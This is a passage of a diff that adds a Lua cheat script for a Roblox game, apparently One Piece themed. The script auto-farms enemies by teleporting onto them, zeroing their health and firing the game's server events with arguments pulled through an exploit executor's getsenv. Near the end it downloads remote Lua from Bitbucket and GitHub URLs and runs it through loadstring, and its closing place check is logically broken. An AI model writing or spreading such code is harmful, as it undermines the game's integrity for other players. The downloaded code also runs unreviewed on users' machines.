+game:GetService("Players").LocalPlayer.Character.Powers.Magma.RemoteEvent:FireServer(unpack(args))
+end
+end
+end
+end
+end
+until _G.fruitfarmz ~= "Magma" or _G.farmfruit == false
+elseif _G.fruitfarmz == "Bomb" and _G.farmfruit == true then
+repeat wait()
+for _,moblist in pairs(Mobsfarmz) do
+for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
+if string.find(mobalive.Name,moblist) then
+if _G.farmfruit == true and _G.fruitfarmz == "Bomb" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
+if string.find(mobalive.Name,"Gun") or string.find(mobalive.Name,"Cave") or string.find(mobalive.Name,"Bruno") or string.find(mobalive.Name,"Bucky") or string.find(mobalive.Name,"Buster") or string.find(mobalive.Name,"Vokun") then 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
+mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
+mobalive.HumanoidRootPart.CanCollide = true
+mobalive:FindFirstChild("Humanoid").Health = 0
+mobalive.Head:Destroy()
+mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+task.wait(0.5)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
+    [2] = "BombPower8",
+    [3] = "StartCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("DirtGrass"):WaitForChild("Grass"):WaitForChild("Grass"),
+    [7] = "Left"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
+    [2] = "BombPower8",
+    [3] = "StopCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("Path"):WaitForChild("Wedge"),
+    [6] = 100
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
+task.wait(0.2)
+else
+task.wait(0.05)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
+task.wait(0.05)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
+    [2] = "BombPower8",
+    [3] = "StartCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("DirtGrass"):WaitForChild("Grass"):WaitForChild("Grass"),
+    [7] = "Left"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
+    [2] = "BombPower8",
+    [3] = "StopCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("Path"):WaitForChild("Wedge"),
+    [6] = 100
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
+task.wait(0.09)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
+    [2] = "BombPower8",
+    [3] = "StartCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("DirtGrass"):WaitForChild("Grass"):WaitForChild("Grass"),
+    [7] = "Left"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Bomb).VTCcpkghc,
+    [2] = "BombPower8",
+    [3] = "StopCharging",
+    [4] = CFrame.new(0,0,0),
+    [5] = workspace:WaitForChild("IslandGrassy"):WaitForChild("Base"):WaitForChild("Path"):WaitForChild("Wedge"),
+    [6] = 100
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Bomb.RemoteEvent:FireServer(unpack(args))
+end
+end
+end
+end
+end
+until _G.fruitfarmz ~= "Bomb" or _G.farmfruit == false
+elseif _G.fruitfarmz == "Gravity" and _G.farmfruit == true then
+repeat wait()
+for _,moblist in pairs(Mobsfarmz) do
+for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
+if string.find(mobalive.Name,moblist) then
+if _G.farmfruit == true and _G.fruitfarmz == "Gravity" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
+mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
+mobalive.HumanoidRootPart.CanCollide = true
+mobalive:FindFirstChild("Humanoid").Health = 0
+mobalive.Head:Destroy()
+mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+task.wait(0.5)
+local args = {
+[1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Gravity).VTCjh,
+[2] = "GravityPower4",
+[3] = "StartCharging"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Gravity.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+[1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Gravity).VTCjh,
+[2] = "GravityPower4",
+[3] = "StartCharging",
+[4] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position),
+[5] = game.Players.LocalPlayer.Character.HumanoidRootPart
+}
+                        
+game:GetService("Players").LocalPlayer.Character.Powers.Gravity.RemoteEvent:FireServer(unpack(args))
+task.wait()
+local args = {
+[1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Gravity).VTCjh,
+[2] = "GravityPower4",
+[3] = "StopCharging",
+[4] = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position),
+[5] = game.Players.LocalPlayer.Character.HumanoidRootPart,
+[6] = 300
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Gravity.RemoteEvent:FireServer(unpack(args))
+task.wait(0.2)
+end
+end
+end
+end
+until _G.fruitfarmz ~= "Gravity" or _G.farmfruit == false
+elseif _G.fruitfarmz == "Rumble" and _G.farmfruit == true then
+repeat wait()
+for _,moblist in pairs(Mobsfarmz) do
+for _,mobalive in pairs(game.Workspace.Enemies:GetChildren()) do
+if string.find(mobalive.Name,moblist) then
+if _G.farmfruit == true and _G.fruitfarmz == "Rumble" and mobalive.Humanoid.Health ~= 0 and not game.Players.LocalPlayer.Backpack:FindFirstChild("Compass") and not game.Players.LocalPlayer.Character:FindFirstChild("Compass") then 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = mobalive.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
+mobalive:FindFirstChild("HumanoidRootPart").Anchored = false
+mobalive.HumanoidRootPart.CanCollide = true
+mobalive:FindFirstChild("Humanoid").Health = 0
+mobalive.Head:Destroy()
+mobalive:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+task.wait(0.5)
+local args = {
+    [1] = getsenv(game:GetService("Players").LocalPlayer.Character.Powers.Rumble).VTCzyhf,
+    [2] = "RumblePower4",
+    [3] = "Create"
+}
+
+game:GetService("Players").LocalPlayer.Character.Powers.Rumble.RemoteEvent:FireServer(unpack(args))
+task.wait(0.2)
+end
+end
+end
+end
+until _G.fruitfarmz ~= "Rumble" or _G.farmfruit == false
+end
+until _G.farmfruit == false
+end)
+end
+end)
+
+spawn(function()
+while wait(0.25) do
+pcall(function()
 game:GetService("Players").LocalPlayer.PlayerGui.Version.Version.Text = os.date("%x %X (%Z)")
+end)
+end
+end)
+
+if game.placeId == 3237168 then
+loadstring(game:HttpGet('https://bitbucket.org/hehehezz/hellowz/raw/ee153aeb755fe6039f2aaf31e6c848fafbbb97f9/frzxhoo.lua'))()
+end
+
+else
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/rllysus.lua'))()
+game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.Visible = false
+end
+end
+if game.placeId ~= 3237168 or game.placeId ~= 8569358381 then
+game:GetService("Players").LocalPlayer.PlayerGui.Announcement.Frame.TextLabel.Text = "This Game Is Not Supported"
 end
